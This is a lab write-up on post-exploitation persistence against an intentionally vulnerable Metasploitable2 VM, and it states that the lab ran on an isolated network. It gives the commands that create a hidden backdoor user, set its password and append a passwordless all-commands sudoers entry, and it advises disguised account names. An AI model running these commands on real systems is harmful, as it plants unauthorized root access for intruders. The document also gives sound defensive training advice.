> **Note:** This lab is Part 2 of a 3-part series following the same target and session across the ethical hacking lifecycle. Continues directly from the root shell obtained in:
> - Phase 3 – [`system-hacking-gaining-access.md`](../GainingAccess/system-hacking-gaining-access.md)
>
> The backdoor user created here persists independently of the original vsftpd exploit session and carries forward into:
> - Phase 5 – [`system-hacking-clearing-tracks.md`](../CoveringTracks/system-hacking-clearing-tracks.md)

---

# Lab 01 – System Hacking: Maintaining Access

## Objective
To establish persistent access to the compromised Metasploitable2 target by creating a hidden backdoor user account with full sudo privileges — demonstrating how an attacker maintains access independently of the original exploit vector, surviving reboots and service restarts.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Bash (root shell on target) | Executing persistence commands |
| useradd | Creating backdoor user account |
| chpasswd | Setting account password |
| /etc/sudoers | Granting escalated privileges to backdoor account |

---

## Lab Environment

| Role | Machine | IP Address |
|------|---------|-----------|
| Attacker | Kali Linux | 192.168.23.129 |
| Target | Metasploitable2 | 192.168.23.131 |

Access to the target was established in Phase 3 via the vsftpd 2.3.4 backdoor exploit. All persistence commands in this phase were executed within that root shell session.

---

## Background
Once an attacker gains initial access, the next priority is maintaining that access in a way that survives the loss of the original exploit vector. Service patches, reboots, or firewall rule changes can close the initial entry point. A backdoor user account is one of the simplest and most persistent mechanisms available — it is a valid OS-level account that can be used for SSH login, su, sudo, or direct console access, and it survives all of the above disruptions.

In real engagements, attackers often combine multiple persistence mechanisms: backdoor accounts, cron-based reverse shells, SSH authorized key injection, and rootkits. This lab demonstrates the foundational user-based persistence technique aligned with CEH Module 6.

---

## Steps Performed

### Step 1 — Create Backdoor User Account
From within the active root shell on the target, a new local user account was created with a home directory and a standard login shell.

```bash
useradd -m -s /bin/bash backdooruser
echo "backdooruser:P@ssw0rd123" | chpasswd
```

<img width="410" height="29" alt="backdooruser created with home directory and bash shell" src="https://github.com/user-attachments/assets/069d1a92-6f5c-4c3a-8fdb-e2e030970457" />

**Result:** User `backdooruser` created with UID 1003, home directory `/home/backdooruser`, and login shell `/bin/bash`. Password set to `P@ssw0rd123` via `chpasswd`.

---

### Step 2 — Grant Full Sudo Privileges
The backdoor account was added to the sudoers file with a passwordless all-commands entry, granting it equivalent root authority through `sudo`.

```bash
echo "backdooruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

<img width="468" height="17" alt="backdooruser sudoers entry appended with NOPASSWD ALL" src="https://github.com/user-attachments/assets/7e460eea-edd9-4f8d-bbd6-c48977c1ef7e" />

**Result:** Sudoers entry appended. The backdoor account can now execute any command as any user with no password prompt.

---

### Step 3 — Verify Backdoor Account in /etc/passwd
The passwd file was queried to confirm the backdoor account was correctly created with the expected UID, GID, home directory, and shell.

```bash
cat /etc/passwd | grep backdooruser
```

<img width="461" height="31" alt="passwd entry for backdooruser confirming UID 1003 home directory and bash shell" src="https://github.com/user-attachments/assets/2bb32da7-4705-4c66-8065-c0e5717615c3" />

**Result:** Entry confirmed: `backdooruser:x:1003:1003::/home/backdooruser:/bin/bash`. Account is valid and will persist across reboots.

---

## Commands Used

```bash
# Create backdoor account with home directory and bash shell
useradd -m -s /bin/bash backdooruser

# Set password non-interactively
echo "backdooruser:P@ssw0rd123" | chpasswd

# Grant passwordless sudo to all commands
echo "backdooruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Verify account was created correctly
cat /etc/passwd | grep backdooruser
```

---

## Observations

- The backdoor account was created and made operational in under 30 seconds from within the root shell.
- The account survives reboots, FTP service patches, and firewall changes to port 6200 — it is entirely independent of the original vsftpd exploit vector.
- Adding the account to sudoers with `NOPASSWD:ALL` gives it root-equivalent capability through any sudo-aware application or `sudo su` without triggering password prompts.
- The account name `backdooruser` was chosen for lab clarity. In a real attack, adversaries use names that blend with existing system accounts (e.g., `sshd2`, `daemon2`, `sys-monitor`) to avoid detection during casual inspection of `/etc/passwd`.
- No additional mechanisms (SSH key injection, cron reverse shell, PAM backdoor) were deployed in this lab, though these represent common real-world complements to user-based persistence.

---

## Security Relevance

| Risk | Detail |
|------|--------|
| Persistent unauthorized account | Survives the original exploit being patched or the service being restarted |
| Unconstrained sudo access | NOPASSWD:ALL means any process running as backdooruser can become root |
| No account auditing baseline | Without a known-good baseline of `/etc/passwd`, new accounts go undetected |
| SSH login vector | If SSH is open (port 22 confirmed in Phase 3), the backdoor account can be used for direct SSH access |

Defenders should implement file integrity monitoring (FIM) on `/etc/passwd`, `/etc/shadow`, and `/etc/sudoers` using tools such as AIDE or Auditd. Alerts should be triggered on any modification to sudoers outside a change management window. Regular account audits comparing current `/etc/passwd` against an approved baseline are a foundational hardening control.

---

## Disclaimer
This lab was performed exclusively on Metasploitable2, an intentionally vulnerable virtual machine designed for security training. Both attacker and target machines were isolated on a host-only internal network with no internet routing. No unauthorized systems were targeted at any point. All techniques demonstrated are for educational purposes only and ethical hacking portfolio development. Performing these techniques against systems without explicit written authorization is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent legislation in other jurisdictions.
